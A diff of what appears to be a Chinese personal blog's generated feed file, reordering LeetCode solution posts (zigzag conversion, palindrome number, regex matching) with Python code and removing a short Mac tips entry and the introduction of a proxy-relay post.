-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：按行取值（就叫找规律吧…）"><a href="#解法1：按行取值（就叫找规律吧…）" class="headerlink" title="解法1：按行取值（就叫找规律吧…）"></a>解法1：按行取值（就叫找规律吧…）</h5><p>我们可以从这个Z字形（大哥这明明就是N字形啊）的排列上找出些规律，比如如果<code>numRows = 3</code>，那么第一行的两个元素相差的距离为4，也就是<code>d = 2*numRows-2</code>，最后一行亦如此，而从示例2我们可以看出，中间各行的元素间隔虽然不相等，但是只有两种分布，一种比第一行的<code>d</code>要少一部分，而这一部分就是<code>2*距离第一行的行数差</code>，那另一种元素间隔就是<code>d-刚刚那种元素间隔</code>，就这么简单？还真就这么被找规律找出来了hhh，我都想笑了。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> numRows &gt;= len(s):</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ans = []</span><br><span class="line">            i = <span class="hljs-number">0</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            <span class="hljs-comment"># 第一行</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-comment"># 中间各行</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,numRows):</span><br><span class="line">                n = n - <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> i<span class="hljs-number">-1</span> &lt; len(s):</span><br><span class="line">                    ans.append(s[i<span class="hljs-number">-1</span>])</span><br><span class="line">                    i += n</span><br><span class="line">            <span class="hljs-comment"># 最后一行</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            i = numRows<span class="hljs-number">-1</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure><br>但是看完评论区另一种解法我气的够呛，卧槽我怎么能这么傻，害，这么明显的规律我都没发现…</p>
-<h5 id="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"><a href="#解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）" class="headerlink" title="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"></a>解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）</h5><p>上一种方法是从<code>s</code>中按最终答案的顺序取值，那我们能不能换个思考方式，按照<code>s</code>的存储顺序取值呢。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows &gt;= len(s) <span class="hljs-keyword">or</span> numRows == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        ans, count, d = [<span class="hljs-string">''</span>]*numRows, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:</span><br><span class="line">            ans[count] += i</span><br><span class="line">            count += d</span><br><span class="line">            <span class="hljs-comment"># 当到第一行和最后一行的时候d需要反转</span></span><br><span class="line">            <span class="hljs-keyword">if</span> count==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> count==numRows<span class="hljs-number">-1</span>:</span><br><span class="line">                d = -d</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>LeetCode系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>LeetCode DAY 5 (7-8)</title>
     <url>/2020/01/14/leetcode-day5/</url>
     <content><![CDATA[<p>虽然打了一下午的游戏，但懒狗不会忘记刷题的！<a id="more"></a></p>
@@ -522,32 +508,14 @@
       </categories>
   </entry>
   <entry>
-    <title>LeetCode DAY 6 (9-10)</title>
-    <url>/2020/01/15/leetcode-day6/</url>
-    <content><![CDATA[<p>日常更新冒泡…<a id="more"></a></p>
-<h3 id="9-回文数（简单）"><a href="#9-回文数（简单）" class="headerlink" title="9. 回文数（简单）"></a>9. 回文数（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
-<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：转为字符串处理"><a href="#解法1：转为字符串处理" class="headerlink" title="解法1：转为字符串处理"></a>解法1：转为字符串处理</h5><p>利用python的切片功能一行代码即可解决。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> str(x) == str(x)[::<span class="hljs-number">-1</span>]</span><br></pre></td></tr></table></figure></p>
-<h5 id="解法2：不利用字符串"><a href="#解法2：不利用字符串" class="headerlink" title="解法2：不利用字符串"></a>解法2：不利用字符串</h5><p>翻转整个数值，官方题解有说反转一半，以防溢出，但是溢出不就不是回文数了，因此我觉得不需要考虑溢出。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        ans = <span class="hljs-number">0</span></span><br><span class="line">        pri = x</span><br><span class="line">        <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>:</span><br><span class="line">            ans = x%<span class="hljs-number">10</span> + ans*<span class="hljs-number">10</span></span><br><span class="line">            x //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ans == pri:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure></p>
-<hr>
-<h3 id="10-正则表达式匹配（困难）"><a href="#10-正则表达式匹配（困难）" class="headerlink" title="10. 正则表达式匹配（困难）"></a>10. 正则表达式匹配（困难）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>&#39;.&#39;</code>和<code>&#39;*&#39;</code>的正则表达式匹配。<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">&apos;.&apos; 匹配任意单个字符</span><br><span class="line">&apos;*&apos; 匹配零个或多个前面的那一个元素</span><br></pre></td></tr></table></figure><br>所谓匹配，是要涵盖整个字符串<code>s</code>的，而不是部分字符串。</p>
-<ul>
-<li><code>s</code>可能为空，且只包含从<code>a-z</code>的小写字母。</li>
-<li><code>p</code>可能为空，且只包含从<code>a-z</code>的小写字母，以及字符<code>.</code>和<code>*</code>。</li>
-</ul>
-<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &apos;a&apos;。因此，字符串 &quot;aa&quot; 可被视为 &apos;a&apos; 重复了一次。</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: &quot;.*&quot; 表示可匹配零个或多个（&apos;*&apos;）任意字符（&apos;.&apos;）。</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 表示零个或多个，这里 &apos;c&apos; 为 0 个, &apos;a&apos; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure></p>
-<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure></p>
-<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力递归"><a href="#解法1：暴力递归" class="headerlink" title="解法1：暴力递归"></a>解法1：暴力递归</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> s</span><br><span class="line">        <span class="hljs-comment"># 出现'.'的情况</span></span><br><span class="line">        first = bool(s) <span class="hljs-keyword">and</span> p[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (s[<span class="hljs-number">0</span>], <span class="hljs-string">'.'</span>)</span><br><span class="line">        <span class="hljs-comment"># 出现'*'的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==<span class="hljs-string">'*'</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> self.isMatch(s, p[<span class="hljs-number">2</span>:]) <span class="hljs-keyword">or</span> (first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p))</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p[<span class="hljs-number">1</span>:])</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>当出现<code>&#39;.&#39;</code>的时候，因为它匹配任意字符，因此只要额外判断<code>p[i]</code>是否等于<code>&#39;.&#39;</code>即可；</li>
-<li>对于出现<code>&#39;*&#39;</code>时，因为它匹配0个到任意个星号前面的字符，所以我们需要对它进行不同的处理，虽然他能匹配0～n个字符，但是对于递归而言，只有两种情况：0个和1个。</li>
-</ul>
-<h5 id="解法2-递归优化"><a href="#解法2-递归优化" class="headerlink" title="解法2: 递归优化"></a>解法2: 递归优化</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-comment"># 定义一个字典作为备忘录</span></span><br><span class="line">        memo = dict()</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dp</span><span class="hljs-params">(i, j)</span>:</span></span><br><span class="line">        	<span class="hljs-comment"># 避免重复计算</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (i,j) <span class="hljs-keyword">in</span> memo: <span class="hljs-keyword">return</span> memo[(i,j)] </span><br><span class="line">            <span class="hljs-keyword">if</span> j==len(p): <span class="hljs-keyword">return</span> i==len(s)</span><br><span class="line">            first = i&lt;len(s) <span class="hljs-keyword">and</span> p[j] <span class="hljs-keyword">in</span> (s[i], <span class="hljs-string">'.'</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> j&lt;len(p)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> p[j+<span class="hljs-number">1</span>] == <span class="hljs-string">'*'</span>:</span><br><span class="line">                ans = dp(i,j+<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                ans = first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>)</span><br><span class="line">            memo[(i,j)] = ans</span><br><span class="line">            <span class="hljs-keyword">return</span> ans</span><br><span class="line">        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)</span><br></pre></td></tr></table></figure><br>使用两个变量<code>i</code>,<code>j</code>记录当前匹配到的位置，从而避免使用子字符串切片，并且将<code>i</code>,<code>j</code>存入备忘录，避免重复计算。</p>
+    <title>LeetCode DAY 4 (6)</title>
+    <url>/2020/01/13/leetcode-day4/</url>
+    <content><![CDATA[<p>嘿！大家好，懒狗又要开始更新Leetcode咯！<a id="more"></a></p>
+<h3 id="6-Z字形变换（中等）"><a href="#6-Z字形变换（中等）" class="headerlink" title="6. Z字形变换（中等）"></a>6. Z字形变换（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。<br>比如输入字符串为<code>&quot;LEETCODEISHIRING&quot;</code>行数为3时，排列如下：<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">L   C   I   R</span><br><span class="line">E T O E S I I G</span><br><span class="line">E   D   H   N</span><br></pre></td></tr></table></figure><br>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;LCIRETOESIIGEDHN&quot;</code>。<br>请你实现这个将字符串进行指定行数变换的函数：<br><code>string convert(string s, int numRows);</code></p>
+<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 3</span><br><span class="line">输出: <span class="hljs-string">"LCIRETOESIIGEDHN"</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 4</span><br><span class="line">输出: <span class="hljs-string">"LDREOEIIECIHNTSG"</span></span><br><span class="line">解释:</span><br><span class="line"></span><br><span class="line">L     D     R</span><br><span class="line">E   O E   I I</span><br><span class="line">E C   I H   N</span><br><span class="line">T     S     G</span><br></pre></td></tr></table></figure></p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：按行取值（就叫找规律吧…）"><a href="#解法1：按行取值（就叫找规律吧…）" class="headerlink" title="解法1：按行取值（就叫找规律吧…）"></a>解法1：按行取值（就叫找规律吧…）</h5><p>我们可以从这个Z字形（大哥这明明就是N字形啊）的排列上找出些规律，比如如果<code>numRows = 3</code>，那么第一行的两个元素相差的距离为4，也就是<code>d = 2*numRows-2</code>，最后一行亦如此，而从示例2我们可以看出，中间各行的元素间隔虽然不相等，但是只有两种分布，一种比第一行的<code>d</code>要少一部分，而这一部分就是<code>2*距离第一行的行数差</code>，那另一种元素间隔就是<code>d-刚刚那种元素间隔</code>，就这么简单？还真就这么被找规律找出来了hhh，我都想笑了。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> numRows &gt;= len(s):</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ans = []</span><br><span class="line">            i = <span class="hljs-number">0</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            <span class="hljs-comment"># 第一行</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-comment"># 中间各行</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,numRows):</span><br><span class="line">                n = n - <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> i<span class="hljs-number">-1</span> &lt; len(s):</span><br><span class="line">                    ans.append(s[i<span class="hljs-number">-1</span>])</span><br><span class="line">                    i += n</span><br><span class="line">            <span class="hljs-comment"># 最后一行</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            i = numRows<span class="hljs-number">-1</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure><br>但是看完评论区另一种解法我气的够呛，卧槽我怎么能这么傻，害，这么明显的规律我都没发现…</p>
+<h5 id="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"><a href="#解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）" class="headerlink" title="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"></a>解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）</h5><p>上一种方法是从<code>s</code>中按最终答案的顺序取值，那我们能不能换个思考方式，按照<code>s</code>的存储顺序取值呢。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows &gt;= len(s) <span class="hljs-keyword">or</span> numRows == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        ans, count, d = [<span class="hljs-string">''</span>]*numRows, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:</span><br><span class="line">            ans[count] += i</span><br><span class="line">            count += d</span><br><span class="line">            <span class="hljs-comment"># 当到第一行和最后一行的时候d需要反转</span></span><br><span class="line">            <span class="hljs-keyword">if</span> count==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> count==numRows<span class="hljs-number">-1</span>:</span><br><span class="line">                d = -d</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
         <category>LeetCode系列</category>
@@ -596,23 +564,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Mac使用小技巧</title>
-    <url>/2020/03/12/mac-tips/</url>
-    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
-<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
-<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
-<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
-<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
-<li>浏览器新建标签页：<code>command + T</code></li>
-<li>快速调用emoji表情：<code>control + command + space</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Python 多进程</title>
     <url>/2019/08/27/multiprocessing/</url>
     <content><![CDATA[<p>学习廖雪峰的Python教程中的多进程部分，知识点整理<a id="more"></a></p>
@@ -648,30 +599,35 @@
       </categories>
   </entry>
   <entry>
-    <title>通过国内服务器转发流量科学上网</title>
-    <url>/2020/02/04/network-jump/</url>
-    <content><![CDATA[<p>从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。<a id="more"></a><br>具体方法借鉴于该篇文章：<a href="https://www.hijk.pw/forward-traffic-via-internal-vps/" target="_blank" rel="noopener">Click Here</a><br>如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。<br>完成此博文所介绍的方法的基本条件：</p>
+    <title>LeetCode DAY 6 (9-10)</title>
+    <url>/2020/01/15/leetcode-day6/</url>
+    <content><![CDATA[<p>日常更新冒泡…<a id="more"></a></p>
+<h3 id="9-回文数（简单）"><a href="#9-回文数（简单）" class="headerlink" title="9. 回文数（简单）"></a>9. 回文数（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
+<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：转为字符串处理"><a href="#解法1：转为字符串处理" class="headerlink" title="解法1：转为字符串处理"></a>解法1：转为字符串处理</h5><p>利用python的切片功能一行代码即可解决。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> str(x) == str(x)[::<span class="hljs-number">-1</span>]</span><br></pre></td></tr></table></figure></p>
